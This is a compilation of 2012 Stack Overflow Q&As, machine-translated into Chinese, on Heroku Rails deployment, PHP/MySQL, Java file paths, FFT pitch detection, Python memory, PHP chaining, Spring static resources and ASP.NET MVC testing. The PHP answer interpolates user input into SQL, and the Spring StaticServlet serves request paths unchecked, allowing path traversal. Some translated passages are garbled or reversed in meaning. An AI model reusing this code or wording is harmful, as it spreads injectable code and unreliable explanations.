好吧，好像我不能真正在 Heroku 中部署我的测试应用程序。

部署问题仍然存在。

这是我的日志。请帮我分析错误：

```
C:\Users\Rowell\peekboxbeta>heroku logs --app gentle-beach-4013
2012-07-13T03:41:40+00:00 app[web.12]:
2012-07-13T03:41:40+00:00 app[web.12]: ActionController::RoutingError (No route matches [GET] "/users/assets/pb/f
avicon.jpg"):
2012-07-13T03:41:40+00:00 app[web.12]:
2012-07-13T03:41:40+00:00 app[web.12]:
2012-07-13T03:41:40+00:00 app[web.12]:
2012-07-13T03:41:40+00:00 app[web.12]: cache: [GET /users/assets/pb/favicon.jpg] miss
2012-07-13T03:41:40+00:00 heroku[router]: GET www.peekbox.tv/users/assets/pb/favicon.jpg dyno=web.12 queue=0 wait
=0ms service=6ms status=404 bytes=728
2012-07-13T03:41:40+00:00 app[web.5]:
2012-07-13T03:41:40+00:00 app[web.5]:
2012-07-13T03:41:40+00:00 app[web.5]: Started GET "/assets/pb/prev-arrow.png" for 203.177.42.214 at 2012-07-13 11
:41:40 +0800
2012-07-13T03:41:40+00:00 app[web.5]: cache: [GET /assets/pb/prev-arrow.png] stale, valid, store
2012-07-13T03:41:40+00:00 heroku[router]: GET www.peekbox.tv/assets/pb/menu-bg.png dyno=web.6 queue=0 wait=0ms se
rvice=3ms status=200 bytes=2835
2012-07-13T03:41:40+00:00 heroku[router]: GET www.peekbox.tv/assets/pb/bird.png dyno=web.2 queue=0 wait=0ms servi
ce=4ms status=200 bytes=1833
2012-07-13T03:41:40+00:00 app[web.2]: Started GET "/assets/pb/bird.png" for 203.177.42.214 at 2012-07-13 11:41:40
 +0800
2012-07-13T03:41:40+00:00 app[web.2]:
2012-07-13T03:41:40+00:00 app[web.2]:
2012-07-13T03:41:40+00:00 app[web.2]: cache: [GET /assets/pb/bird.png] stale, valid, store
2012-07-13T03:41:40+00:00 app[web.4]:
2012-07-13T03:41:40+00:00 app[web.4]:
2012-07-13T03:41:40+00:00 app[web.4]: Started GET "/assets/pb/twitter_32.png" for 203.177.42.214 at 2012-07-13 11
:41:40 +0800
2012-07-13T03:41:40+00:00 app[web.4]: cache: [GET /assets/pb/twitter_32.png] stale, valid, store
2012-07-13T03:41:40+00:00 app[web.11]:
2012-07-13T03:41:40+00:00 app[web.11]:
2012-07-13T03:41:40+00:00 app[web.11]: Started GET "/assets/pb/bottom-shadow.png" for 203.177.42.214 at 2012-07-1
3 11:41:40 +0800
2012-07-13T03:41:40+00:00 heroku[router]: GET www.peekbox.tv/assets/pb/twitter_32.png dyno=web.4 queue=0 wait=0ms
 service=4ms status=200 bytes=2313
2012-07-13T03:41:40+00:00 app[web.11]: cache: [GET /assets/pb/bottom-shadow.png] stale, valid, store
2012-07-13T03:41:40+00:00 heroku[router]: GET www.peekbox.tv/assets/pb/bottom-shadow.png dyno=web.11 queue=0 wait
=0ms service=6ms status=200 bytes=145
2012-07-13T03:41:40+00:00 heroku[router]: GET www.peekbox.tv/assets/pb/prev-arrow.png dyno=web.5 queue=0 wait=0ms
 service=5ms status=200 bytes=1043
2012-07-13T03:41:40+00:00 app[web.9]:
2012-07-13T03:41:40+00:00 app[web.9]:
2012-07-13T03:41:40+00:00 app[web.9]: Started GET "/assets/pb/facebook_32.png" for 203.177.42.214 at 2012-07-13 1
1:41:40 +0800
2012-07-13T03:41:40+00:00 app[web.9]: cache: [GET /assets/pb/facebook_32.png] stale, valid, store
2012-07-13T03:41:40+00:00 app[web.3]:
2012-07-13T03:41:40+00:00 app[web.3]:
2012-07-13T03:41:40+00:00 app[web.3]: Started GET "/assets/pb/footer-bullet.png" for 203.177.42.214 at 2012-07-13
 11:41:40 +0800
2012-07-13T03:41:40+00:00 heroku[router]: GET www.peekbox.tv/assets/pb/facebook_32.png dyno=web.9 queue=0 wait=0m
s service=18ms status=200 bytes=2094
2012-07-13T03:41:40+00:00 app[web.3]: cache: [GET /assets/pb/footer-bullet.png] stale, valid, store
2012-07-13T03:41:40+00:00 heroku[router]: GET www.peekbox.tv/assets/pb/footer-bullet.png dyno=web.3 queue=0 wait=
0ms service=21ms status=200 bytes=391
2012-07-13T03:41:40+00:00 app[web.6]:
2012-07-13T03:41:40+00:00 app[web.6]:
2012-07-13T03:41:40+00:00 app[web.6]: Started GET "/assets/pb/menu-bg.png" for 203.177.42.214 at 2012-07-13 11:41
:40 +0800
2012-07-13T03:41:40+00:00 app[web.6]: Started GET "/assets/pb/header-glow.png" for 203.177.42.214 at 2012-07-13 1
1:41:40 +0800
2012-07-13T03:41:40+00:00 app[web.6]: cache: [GET /assets/pb/menu-bg.png] stale, valid, store
2012-07-13T03:41:40+00:00 app[web.6]:
2012-07-13T03:41:40+00:00 app[web.6]:
2012-07-13T03:41:40+00:00 app[web.6]: cache: [GET /assets/pb/header-glow.png] stale, valid, store
2012-07-13T03:41:40+00:00 app[web.6]:
2012-07-13T03:41:40+00:00 app[web.6]:
2012-07-13T03:41:40+00:00 app[web.6]: Started GET "/assets/pb/twitter-border.png" for 203.177.42.214 at 2012-07-1
3 11:41:40 +0800
2012-07-13T03:41:40+00:00 app[web.6]: cache: [GET /assets/pb/twitter-border.png] stale, valid, store
2012-07-13T03:41:40+00:00 heroku[router]: GET www.peekbox.tv/assets/pb/header-glow.png dyno=web.6 queue=0 wait=0m
s service=36ms status=200 bytes=36446
2012-07-13T03:41:40+00:00 heroku[router]: GET www.peekbox.tv/assets/pb/twitter-border.png dyno=web.6 queue=0 wait
=0ms service=37ms status=200 bytes=117
2012-07-13T03:41:41+00:00 app[web.10]:
2012-07-13T03:41:41+00:00 app[web.10]: Started GET "/assets/pb/noise.png" for 203.177.42.214 at 2012-07-13 11:41:
40 +0800
2012-07-13T03:41:41+00:00 app[web.10]:
2012-07-13T03:41:41+00:00 app[web.10]: cache: [GET /assets/pb/noise.png] stale, valid, store
2012-07-13T03:41:41+00:00 heroku[router]: GET www.peekbox.tv/assets/pb/noise.png dyno=web.10 queue=0 wait=0ms ser
vice=957ms status=304 bytes=0
2012-07-13T03:41:41+00:00 app[web.10]:
2012-07-13T03:41:41+00:00 app[web.10]: Started GET "/assets/pb/next-arrow.png" for 203.177.42.214 at 2012-07-13 1
1:41:41 +0800
2012-07-13T03:41:41+00:00 app[web.10]:
2012-07-13T03:41:41+00:00 app[web.10]: cache: [GET /assets/pb/next-arrow.png] stale, valid, store
2012-07-13T03:41:41+00:00 heroku[router]: GET www.peekbox.tv/assets/pb/next-arrow.png dyno=web.10 queue=0 wait=0m
s service=858ms status=304 bytes=0
2012-07-13T03:41:42+00:00 app[web.8]: Started GET "/bo" for 180.194.245.32 at 2012-07-13 11:41:42 +0800
2012-07-13T03:41:42+00:00 app[web.8]:
2012-07-13T03:41:42+00:00 app[web.8]:   Processing by InformationController#show as HTML
2012-07-13T03:41:42+00:00 app[web.8]:   Parameters: {"username"=>"bo"}
2012-07-13T03:41:42+00:00 app[web.8]:
2012-07-13T03:41:42+00:00 app[web.8]: Rendered information/_pic.html.haml (0.9ms)
2012-07-13T03:41:42+00:00 app[web.8]: Rendered information/_d
ata.html.haml (0.5ms)
2012-07-13T03:41:42+00:00 app[web.8]: Rendered information/_controls.html.haml (6.3ms)
2012-07-13T03:41:43+00:00 app[web.8]: Rendered information/_wall_post.html.haml (1227.0ms)
2012-07-13T03:41:43+00:00 app[web.8]: Rendered information/show.html.haml within layouts/application (1236.4ms)
2012-07-13T03:41:43+00:00 app[web.8]: Completed 500 Internal Server Error in 1242ms
2012-07-13T03:41:43+00:00 app[web.8]:
2012-07-13T03:41:43+00:00 app[web.8]: ActionView::Template::Error (undefined method `profilepic' for nil:NilClass
):
2012-07-13T03:41:43+00:00 app[web.8]:     5:    %div.post
2012-07-13T03:41:43+00:00 app[web.8]:     6:            -@wall_posts.each do |post|
2012-07-13T03:41:43+00:00 app[web.8]:     8:                            -unless post.poster.profilepic == nil
2012-07-13T03:41:43+00:00 app[web.8]:     9:                                    %div#wall-post
2012-07-13T03:41:43+00:00 app[web.8]:     7:                    %div
2012-07-13T03:41:43+00:00 app[web.8]:     10:                                           %div#wall-poster-pic
2012-07-13T03:41:43+00:00 app[web.8]:     11:                                                   =link_to (image_t
ag post.poster.profilepic_url(:profile_pic) ,:style => "width:50px;height:76px"), other_user_path(post.poster.use
rname)
2012-07-13T03:41:43+00:00 app[web.8]:   app/views/information/_wall_post.html.haml:8:in `block in _app_views_info
rmation__wall_post_html_haml___575386532158736245_58517160'
2012-07-13T03:41:43+00:00 app[web.8]:   app/views/information/_wall_post.html.haml:6:in `_app_views_information__
wall_post_html_haml___575386532158736245_58517160'
2012-07-13T03:41:43+00:00 app[web.8]:   app/views/information/show.html.haml:20:in `_app_views_information_show_h
tml_haml__598682898842295215_31999300'
2012-07-13T03:41:43+00:00 app[web.8]:
2012-07-13T03:41:43+00:00 app[web.8]:
2012-07-13T03:41:43+00:00 app[web.8]: cache: [GET /bo] miss
2012-07-13T03:41:43+00:00 heroku[router]: GET www.peekbox.tv/bo dyno=web.8 queue=0 wait=0ms service=1252ms status
=500 bytes=728
2012-07-13T03:41:43+00:00 heroku[nginx]: 180.194.245.32 - - [13/Jul/2012:03:41:43 +0000] "GET /bo HTTP/1.0" 500 7
28 "http://www.peekbox.tv/profile" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20
.0.1132.57 Safari/536.11" www.peekbox.tv
2012-07-13T03:41:44+00:00 heroku[nginx]: 180.194.245.32 - - [13/Jul/2012:03:41:44 +0000] "GET /favicon.ico HTTP/1
.0" 304 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536
.11" www.peekbox.tv
2012-07-13T03:42:27+00:00 heroku[worker.2]: State changed from crashed to starting
2012-07-13T03:42:31+00:00 heroku[worker.2]: Starting process with command `bundle exec rake jobs:work`
2012-07-13T03:42:32+00:00 heroku[worker.2]: State changed from starting to up
2012-07-13T03:42:37+00:00 app[worker.2]: rake aborted!
2012-07-13T03:42:37+00:00 app[worker.2]: Don't know how to build task 'jobs:work'
2012-07-13T03:42:37+00:00 app[worker.2]:
2012-07-13T03:42:37+00:00 app[worker.2]: (See full trace by running task with --trace)
2012-07-13T03:42:38+00:00 heroku[worker.2]: Process exited with status 1
2012-07-13T03:42:38+00:00 heroku[worker.2]: State changed from up to crashed

C:\Users\Rowell\peekboxbeta>heroku rake db:version
WARNING: `heroku rake` has been deprecated. Please use `heroku run rake` instead.
Running `rake db:version` attached to terminal... failed
 !    No app specified.
 !    Run this command from an app folder or specify which app to use with --app <app name>

C:\Users\Rowell\peekboxbeta>heroku rake db:version --app gentle-beach-4013
WARNING: `heroku rake` has been deprecated. Please use `heroku run rake` instead.
Running `rake db:version` attached to terminal... up, run.1
Current version: 20120501142157 
```

说真的，它仍然因大量错误而崩溃

请参阅： http: [//peekboxtest.herokuapp.com/](http://peekboxtest.herokuapp.com/)

谢谢！我现在很绝望。我已经尝试将 gem pg 放在生产组中，将 sqlite3 放在开发组中。但没有其他事情发生。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T05:33:44.820

编辑**config/application.rb**

```
config.assets.enabled = true 
```

将以下内容添加到 Gemfile。

```
group :assets do
  gem 'therubyracer'
  gem 'sass-rails', "  ~> 3.1.0"
  gem 'coffee-rails', "~> 3.1.0"
  gem 'uglifier'
end 
```

跑

```
bundle install

rake assets:precompile 
```

试试看。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T07:34:33.177

Your error is related to

```
ActionView::Template::Error (undefined method `profilepic' for nil:NilClass 
```

which is being thrown as a result of

```
unless post.poster.profilepic 
```

so your `post` does not have an associated `poster` to it - fix by checking if post has a posted via

```
unless post.poster? && post.poster.profilepic
... 
```

# php - MySQL 动态选择框

> ID：11553041
> 
> 赞同：1
> 
> 时间：2012-07-19T02:18:01.593
> 
> 标签：php, mysql, select

我在 MySQL 中有两个表（并使用 PHP），如下所示：

```
------------------------       
|                      |
|        sizes         |   <--- This table is what populates the Select Box
|                      |
------------------------
|    id     |   name   |
|           |          |           
|     1     |   Small  |
|     2     |   Medium |
|     3     |   Large  |
------------------------

----------------------------------------       
|                                      |
|            user_entries              | <--- This table relates to above by "size_id"
|                                      |
----------------------------------------
|    id     |   user_id  |   size_id   |
|           |            |             |
|     1     |     25     |      2      |
|     2     |     12     |      3      |
|     3     |     15     |      3      |
---------------------------------------- 
```

**我的问题是：**如何编写我的 SELECT 语句来填充所有尺寸选项（小、中、大）的选择框，并根据用户的偏好预先选择选项。

例如，对于 user_id=25 的用户，HTML 如下所示：

```
<select>
   <option>Small</option>
   <option selected="selected">Medium</option>
   <option>Large</option>
</select> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T02:43:20.317

SQL是：

```
SELECT s.id, s.name, ue.id as UserSelected
  FROM sizes s
    LEFT JOIN user_entries ue ON s.id=ue.size_id AND ue.user_id=XXX
  ORDER BY s.id 
```

（根据需要设置顺序）

当您运行结果时，如果“UserSelected”不为 NULL（即有一个值），那么您就有了选定的条目。

* * *

SQL提示：尽量保持表之间的列名相同，使得“size_id”是size表中id字段的名称，同时也是user_entries表中的外键；这样，您就不会在此查询中有两个会导致问题的“id”列。

您也可能不需要 user_entries 表中的“id”列，因为您将始终根据 user_id 进行搜索/更新？如果您不需要它，只需少一列/索引即可处理。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T02:44:13.450

```
// get size id from user entries table based on user id
$result2= mysql_query("SELECT size_id from user_entries where user_id='$user_id'");
$row2 = mysql_fetch_assoc($result2);
$sel_size_id =$row2['size_id'];

//dropdownlist query
$query="SELECT name,id FROM sizes";
/* You can add order by clause to the sql statement if the names are to be displayed in alphabetical order */
$result = mysql_query ($query);

//populate the dropdownlist
while($row = mysql_fetch_assoc($result)) { 
      //determine if the size id is selected
      $selected = ($row['size_id '] == $sel_size_id ) ? ' selected="selected" ' : NULL;
      echo  '<option value="' . $row['size_id']. '"' . $selected . '>'.$row['name'].'</option>\n';
} 
```

# java - 系统找不到java中指定的文件

> ID：11553042
> 
> 赞同：24
> 
> 时间：2012-07-19T02:18:07.103
> 
> 标签：java, file

我正在制作一个打开和读取文件的程序。这是我的代码：

```
import java.io.*;

public class FileRead{
    public static void main(String[] args){
        try{
            File file = new File("hello.txt");
            System.out.println(file.getCanonicalPath());
            FileInputStream ft = new FileInputStream(file);

            DataInputStream in = new DataInputStream(ft);
            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            String strline;

            while((strline = br.readLine()) != null){
                System.out.println(strline);
            }
            in.close();
        }catch(Exception e){
            System.err.println("Error: " + e.getMessage());
        }
    }
} 
```

但是当我运行时，我得到了这个错误：

```
C:\Users\User\Documents\Workspace\FileRead\hello.txt
Error: hello.txt (The system cannot find the file specified) 
```

my`FileRead.java`和`hello.txt`where 在同一目录中，可以在以下位置找到：

```
C:\Users\User\Documents\Workspace\FileRead 
```

我想知道我做错了什么？

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-07-19T02:23:44.397

尝试通过调用列出目录中所有文件的名称：

```
File file = new File(".");
for(String fileNames : file.list()) System.out.println(fileNames); 
```

看看你是否会在列表中找到你的文件。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-07-19T02:30:24.210

我已经复制了你的代码，它运行良好。

我怀疑您只是在 hello.txt 的实际文件名中遇到了一些问题，或者您在错误的目录中运行。考虑通过@Eng.Fouad 建议的方法进行验证

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-07-19T02:27:26.080

您需要提供文件所在位置的绝对路径名。

```
 File file = new File("C:\\Users\\User\\Documents\\Workspace\\FileRead\\hello.txt"); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2014-01-31T10:44:23.023

在您的 IDE 中，右键单击要读取的文件并选择“复制路径”，然后将其粘贴到您的代码中。

请注意，Windows 隐藏了文件扩展名，因此如果您创建一个文本文件“myfile.txt”，它实际上可能会保存为“myfile.txt.txt”

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2014-07-01T16:50:57.930

通常，在 File 构造函数中仅说明文件名意味着该文件与 java 文件位于同一目录中。但是，当使用诸如 NetBeans 和 Eclipse 之类的 IDE 时，您必须将文件保存在项目文件夹目录中。所以我认为检查这将解决你的问题。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-07-19T03:05:16.623

你是如何运行程序的？

运行的不是 java 文件，而是通过编译 java 代码创建的 .class 文件。您要么需要像 user1420750 所说的那样指定绝对路径，要么需要指定`System.getProperty("user.dir")`目录的相对路径。这应该是工作目录或运行 java 命令的目录。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-12-20T06:37:28.583

首先创建与您指定的路径相同的文件夹。然后创建文件

```
File dir = new File("C:\\USER\\Semple_file\\");
File file = new File("C:\\USER\\Semple_file\\abc.txt");

if(!file.exists())
{
    dir.mkdir();
    file.createNewFile();
    System.out.println("File,Folder Created.);
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-07-01T16:45:45.870

当你运行一个 jar 时，你的 Main 类本身变成了 args[0] 并且你的文件名紧随其后。

我有同样的问题：当提供来自 eclipse 的绝对路径时，我可以找到我的文件（因为我将文件称为 args[0]）。然而，当我从 jar 中运行相同的内容时，它试图找到我的主类 - 这就是我想到应该从 args[1] 读取文件的想法。

# java - 假人的频率/音高检测

> ID：11553047
> 
> 赞同：9
> 
> 时间：2012-07-19T02:19:24.490
> 
> 标签：java, android, audio

虽然我在这个网站上有很多关于音高检测概念的问题......他们都处理这个我不熟悉的神奇*FFT 。*我正在尝试构建一个需要实现音高检测的 Android 应用程序。我完全不了解用于执行此操作的算法。

不可能*那么*难吧？毕竟，Android 市场上有大约 80 亿个吉他调音器应用程序。

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-19T21:11:53.397

FFT 并不是实现音高检测或音高跟踪的最佳方式。一个问题是最响亮的频率并不总是基频。另一个原因是，FFT 本身需要大量数据和处理才能获得调整仪器所需的分辨率，因此它的响应速度可能看起来很慢（即延迟）。另一个问题是，FFT 的结果必然是直观的：你得到一个复数数组，你必须知道如何解释它们。

如果你真的想使用 FFT，这里有一种方法：

1.  低通你的信号。这将有助于防止噪声和高次谐波产生虚假结果。可以想象，您可以跳过这一步，而是将结果加权到 FFT 的较低值。对于某些具有强基频的仪器，这可能不是必需的。
2.  窗口你的信号。Windows 的大小应至少为 4096。越大越好，因为它可以为您提供更好的频率分辨率。如果你太大，它最终会增加你的计算时间和延迟。hann 函数是您窗口的不错选择。[http://en.wikipedia.org/wiki/Hann_function](http://en.wikipedia.org/wiki/Hann_function)
3.  尽可能频繁地对窗口信号进行 FFT。即使重叠的窗口也很好。
4.  FFT 的结果是复数。使用 sqrt( real^2 + imag^2 ) 找到每个复数的大小。FFT 数组中幅度最大的索引是您的峰值频率的索引。
5.  您可能希望对多个 FFT 进行平均以获得更一致的结果。

您如何根据索引计算频率？好吧，假设你有一个大小为 N 的窗口。在你 FFT 之后，你将有 N 个复数。如果您的峰值是第 n 个，并且您的采样率为 44100，那么您的峰值频率将接近 (44100/2)*n/N。为什么近？那么你有一个错误（44100/2）* 1/N。对于 4096 的 bin 大小，这大约是 5.3 Hz——在 A440 上很容易听到。您可以通过 1\. 考虑相位来改进这一点（我只描述了如何考虑幅度），2\. 使用更大的窗口（这将增加延迟和处理要求，因为 FFT 是 N Log N 算法），或 3\. 使用更好的算法，如 YIN [http://www.ircam.fr/pcm/cheveign/pss/2002_JASA_YIN.pdf](http://www.ircam.fr/pcm/cheveign/pss/2002_JASA_YIN.pdf)

您可以跳过窗口化步骤，只需将音频分解为您想要分析的多个样本的离散块。这等效于使用方形窗口，虽然有效，但您的结果中可能会出现更多噪音。

顺便说一句：许多调谐器应用程序许可代码来自第三方，例如 z-plane 和 iZotope。

**更新**：如果您想要 C 源代码和 FFT 方法的完整教程，我已经[编写了一个](http://blog.bjornroche.com/2012/07/frequency-detection-using-fft-aka-pitch.html). 该代码可以在 Mac OS X 上编译和运行，并且应该可以很容易地转换到其他平台。它的设计不是最好的，但它的设计目的是易于理解。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-19T02:24:50.860

快速傅立叶变换将函数从时域更改为频域。因此，不是您从麦克风获得的信号`f(t)`在哪里，并且是该信号的时间索引，而是在哪里是 FFT和是频率。一旦你有了，你只需要找到具有最高振幅的那个，这意味着“最响亮”的频率。这将是您正在拾取的声音的主要音高。`f``t``g(θ)``g``f``θ``g(θ)``θ`

至于实际实现 FFT，如果你在谷歌上搜索“快速傅立叶变换示例代码”，你会得到一堆例子。

# python - Python：在内存中有效存储数据

> ID：11553049
> 
> 赞同：3
> 
> 时间：2012-07-19T02:19:26.737
> 
> 标签：python, memory-management, dictionary

我有以下字典结构（ 10,000 个键，其值由列表列表形成）

```
my_dic ={0: [[1,.65,3, 0, 5.5], [[4, .55, 3, 0, 5.5] ...(10,000th value)[3,.15, 2, 1,   2.5]], 
1:[[1,.65,3, 0, 5.5], [[4, .55, 3, 0, 5.5] ...(10,000th value)[3,.15, 2, 1, 2.5]] .....   
10,000th key:[[1,.65,3, 0, 5.5], [[4, .55, 3, 0, 5.5] ...(10,000th value)[3,.15, 2, 1, 2.5]]} 
```

（注意：数据是虚拟的，所以我只是在键中重复了它）

我想要在较小的基本列表中的逻辑数据类型是

```
inner_list = [int, float, small_int, boolean( 0 or 1), float] 
```

A `sys.getsizeof(inner_list)`, 显示它的大小为`56`字节。为 int 键添加`12`字节使其成为`68`字节。现在，由于我有`10^8`这样的列表（10000*10000），它在内存中的存储正成为一个大问题。我想要内存中的数据（目前没有数据库）。存储它的最优化方法应该是什么？我倾向于认为它一定与`numpy`但不确定什么是最好的方法以及如何实施它。有什么建议么 ？

2）另外，由于我将这些字典存储在内存中，所以我想在使用完它们后立即清除它们占用的内存。有没有办法在python中做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:15:28.357

一种想法是将字典结构分解为更简单的结构，但这可能会影响您处理它的效率。

### 1为键创建单独的[数组](http://docs.python.org/library/array.html)

```
keys = array('i', [key1, key2, ..., key10000]) 
```

根据键的可能值，您可以进一步指定数组的特定 int 类型。此外，键应该是有序的，因此您可以在键表上执行二进制搜索。这样，您还可以从 Python 字典实现中使用的哈希表中节省一些空间。缺点是密钥查找现在需要`O(logn)`时间而不是`O(1)`.

### 2 将 inner_list 元素存储在 10000x10000 矩阵或 100000000 长度列表中

由于从 0 到 9999 的每个位置都`i`对应一个特定的键，可以从 keys 数组中获取，因此可以将每个列表列表放入`i`矩阵的第 ' 行，并将每个`inner_list`元素放入该行的列中。

其他选择是将它们放在一个长列表中并使用关键位置进行索引，`i`这样

```
idx = i*10000 + j 
```

其中`i`是键数组中键`j`的索引，是特定`inner_list`实例的索引。

此外，对于每个`inner_list`元素，您总共可以拥有五个单独的数组，这在一定程度上破坏了内存中数据的局部性

```
int_array = array('i', [value1, ..., value100000000])
float1_array = array('f', [value1, ..., value100000000])
small_int_array = array('h', [value1, ..., value100000000])
bool_array = array('?', [value1, ..., value100000000])
float2_array = array('f', [value1, ..., value100000000]) 
```

布尔数组可以通过将它们打包成位来进一步优化。

另一种方法是使用[struct](http://docs.python.org/library/struct.html)`inner_list`模块将元素打包在二进制字符串中，并将它们存储在单个列表中，而不是五个不同的列表中。

### 3 释放内存

一旦变量超出范围，它们就准备好被垃圾收集，因此可以收回内存。为了更快地执行此操作，例如在函数或循环中，您可能只需将列表替换为虚拟值，以将变量的引用计数降至零。

```
variable = None 
```

### 笔记

但是，这些想法对于您的特定解决方案可能还不够好。还有其他可能性，例如仅将部分数据加载到内存中。这取决于您打算如何处理它。

通常，Python 会占用自己的内存份额来处理指针/结构的内部处理。因此，另一种选择是使用 Fortran、C 或 C++ 等语言来实现特定的数据结构及其处理，这些语言可以更容易地针对您的特定需求进行调整。

# php - 如何在同一行中多次调用类方法？

> ID：11553055
> 
> 赞同：13
> 
> 时间：2012-07-19T02:20:21.057
> 
> 标签：php, class

我在 PHP 中有一个问题。在我的 php 文件中，我创建了以下行：

```
$foo = $wke->template->notify()
                     ->type("ERROR")
                     ->errno("0x14")
                     ->msg("You are not logged.")
                     ->page("login.tpl"); 
```

最后，我需要我的`$foo`变量将返回：

```
$foo->type = "ERROR" 
$foo->errno= "0x14" 
$foo->msg= "You are not logged." 
$foo->page= "login.tpl" 
```

请注意，这`$wke->template`是我需要调用`notify()`元素的地方。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-07-19T04:02:36.890

因为函数返回的是同一个类的对象，所以只用“->”一一调用类的函数的方式。请参见下面的示例。你会得到这个

```
class Wke {

    public $type;
    public $errno;
    public $msg;
    public $page;

    public $template = $this;

    public function notify(){
        return $this;
    }

    public function errorno($error){
        $this->errno = $error;
        return $this; // returning same object so you can call the another function in sequence by just ->
    }
    public function type($type){
        $this->type = $type;
        return $this;
    }
    public function msg($msg){
        $this->msg = $msg;
        return $this;
    }
    public function page($page){
        $this->page = $page;
        return $this;
    }
} 
```

整个魔法是`return $this;`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T02:38:26.560

这些方法中的每一个都需要返回一些对象，该对象将您设置为参数的内容存储在其中。据推测，它将是`template`包含每个对象属性的 ，当您调用该方法时，它会设置相应的变量并返回自身。

# java - 在带有spring的jsp页面中包含样式表

> ID：11553058
> 
> 赞同：0
> 
> 时间：2012-07-19T02:20:48.873
> 
> 标签：java, css, spring

我无法从 jsp 页面链接到样式表。我不知道怎么了。这是我的目录结构：

```
|
|-- WEB-INF
|     |
|     |-- jsp
|          |-- index.jsp
|
|-- resources
      |
      |-- css
           |-- style.css 
```

我试着这样做

```
<link rel="stylesheet" type="text/css" href="/resources/css/style.css" /> 
```

这是我的 web.xml

```
<welcome-file-list>
    <welcome-file>index.jsp</welcome-file>
</welcome-file-list>
<servlet>
    <servlet-name>spring</servlet-name>
    <servlet-class>
        org.springframework.web.servlet.DispatcherServlet
    </servlet-class>
    <load-on-startup>1</load-on-startup>
</servlet>
<servlet-mapping>
    <servlet-name>spring</servlet-name>
    <url-pattern>/</url-pattern>
</servlet-mapping> 
```

请对我做错了什么提供一些帮助，我们将不胜感激。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T07:25:22.523

当您使用 url "/" 映射 spring-servlet(Spring) 时，所有请求都将重定向到 Spring-servlet。包括 .css & .js 等等。

尽管您找到了解决方案，但我为您提供了另一种我使用的替代方案。

```
<servlet>
    <servlet-name>dispatcher</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>dispatcher</servlet-name>
    <url-pattern>/</url-pattern>
  </servlet-mapping>

  <servlet>
    <servlet-name>static</servlet-name>
    <servlet-class>StaticServlet</servlet-class>
  </servlet>

      <servlet-mapping>
        <servlet-name>static</servlet-name>
        <url-pattern>/images/*</url-pattern>
        <url-pattern>/css/*</url-pattern>
        <url-pattern>/img/*</url-pattern>
        <url-pattern>/js/*</url-pattern>
        <url-pattern>/swf/*</url-pattern>
      </servlet-mapping> 
```

提供资源的静态 Servlet

```
import java.io.FileInputStream;
import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.io.IOUtils;

public class StaticServlet extends HttpServlet {

    private static final long serialVersionUID = 8458501870440200891L;

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {
        String resourcePath = req.getServletPath() + req.getPathInfo();
        String realPath = getServletContext().getRealPath(resourcePath);
        FileInputStream fileInputStream = new FileInputStream(realPath);
        try {
            IOUtils.copy(fileInputStream, resp.getOutputStream());
        } finally {
            fileInputStream.close();
        }
    }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T02:55:15.737

您的 css 表位于 css 目录下。试试 href="/resources/css/style.css"

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T06:14:05.813

我遵循[了这些步骤](https://stackoverflow.com/a/4423844/220503)，像魅力一样工作

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-08T06:51:16.827

在您的 dispatcher-servlet.xml 文件中确保以下可用

xmlns:mvc="http://www.springframework.org/schema/mvc"

xsi:schemaLocation="http://www.springframework.org/schema/mvc [http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd](http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd) "

和

那么您应该可以通过 href="/resources/css/style.css" 访问您的 css

# asp.net-mvc-3 - 使用自动映射器时如何对控制器进行单元测试？

> ID：11553062
> 
> 赞同：0
> 
> 时间：2012-07-19T02:22:21.260
> 
> 标签：asp.net-mvc-3, unit-testing, nunit, automapper

这是我的控制器

```
 [POST("signup")]
    public virtual ActionResult Signup(UserRegisterViewModel user)
    {
        if (ModelState.IsValid)
        {
            var newUser = Mapper.Map<UserRegisterViewModel, User>(user);
            var confirmation = _userService.AddUser(newUser);

            if (confirmation.WasSuccessful)
                return RedirectToAction(MVC.Home.Index());
            else
                ModelState.AddModelError("Email", confirmation.Message);

        }
        return View(user);
    } 
```

这是我的单元测试：

```
 [Test]
    public void Signup_Action_When_The_User_Model_Is_Valid_Returns_RedirectToRouteResult()
    {
        // Arrange
        const string expectedRouteName = "~/Views/Home/Index.cshtml";

        var registeredUser = new UserRegisterViewModel { Email = "newuser@test.com", Password = "123456789".Hash()};
        var confirmation = new ActionConfirmation<User>
                               {
                                   WasSuccessful = true,
                                   Message = "",
                                   Value = new User()
                               };
